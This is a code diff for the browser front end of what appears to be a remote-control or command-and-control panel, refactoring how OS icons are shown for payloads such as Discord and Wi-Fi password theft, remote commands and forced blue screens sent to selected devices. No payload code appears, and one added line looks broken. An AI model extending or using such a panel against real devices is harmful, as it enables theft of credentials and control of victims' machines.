@@ -126,6 +126,7 @@ setInterval(updateDevices, 1000);
 
 function send_pem() {
   dropdown = document.getElementById("pem-dropdown").value;
+  console.log(dropdown)
   checkboxes = document.querySelectorAll(".row-select");
 
   // Create an array to store the IDs of selected rows
@@ -151,6 +152,7 @@ function send_pem() {
       explotation_module: dropdown,
       uids: selectedElements,
       input: document.getElementById("pem-input").value,
+      path: document.getElementById("pem-dropwdown").path
     }),
   })
     .then((response) => {
@@ -262,53 +264,36 @@ const pem_windows = document.getElementById("pem-windows");
 const pem_linux = document.getElementById("pem-linux");
 const pem_osx = document.getElementById("pem-osx");
 // Function to update architecture dropdown
-function updateArchDropdown() {
-  const selected_input = pem_dropdown.value;
-  if (selected_input === "send-command") {
-    pem_input.style.display = "block";
+function updateOSIcons() {
+  // Get the selected payload option
+  const selected_option = pem_dropdown.selectedOptions[0];
+  
+  // Get the OS info from the 'os' attribute of the selected option
+  // Parse the string into an array using JSON.parse()
+  const supported_os = JSON.parse(selected_option.getAttribute("os").replace(/'/g, '"'));
+
+  // Initially hide all OS images
+  pem_windows.style.display = "none";
+  pem_linux.style.display = "none";
+  pem_osx.style.display = "none";
+
+  // Show the corresponding OS images based on the selected payload's OS support
+  if (supported_os.includes("windows")) {
     pem_windows.style.display = "block";
+  }
+  if (supported_os.includes("linux")) {
     pem_linux.style.display = "block";
-    pem_osx.style.display = "block";
-  } else {
-    pem_input.style.display = "none";
   }
-  if (selected_input === "bsod") {
-    pem_windows.style.display = "block";
-    pem_linux.style.display = "none";
-    pem_osx.style.display = "none";
-  }
-  if (selected_input === "discord") {
-    pem_windows.style.display = "block";
-    pem_linux.style.display = "none";
-    pem_osx.style.display = "none";
-  }
-  if (selected_input === "wifi-password") {
-    pem_windows.style.display = "block";
-    pem_linux.style.display = "none";
-    pem_osx.style.display = "none";
-  }
-  if (selected_input === "send-command") {
-    pem_windows.style.display = "block";
-    pem_linux.style.display = "block";
-    pem_osx.style.display = "block";
-  }
-  if (selected_input === "restart") {
-    pem_windows.style.display = "block";
-    pem_linux.style.display = "block";
-    pem_osx.style.display = "block";
-  }
-  if (selected_input === "disconect") {
-    pem_windows.style.display = "block";
-    pem_linux.style.display = "block";
+  if (supported_os.includes("osx")) {
     pem_osx.style.display = "block";
   }
 }
 
 // Initial update of architecture dropdown
-updateArchDropdown();
+updateOSIcons();
 
 // Add event listener to OS dropdown
-pem_dropdown.addEventListener("change", updateArchDropdown);
+pem_dropdown.addEventListener("change", updateOSIcons);
 
 
 function showPopupAlert(message, type) {
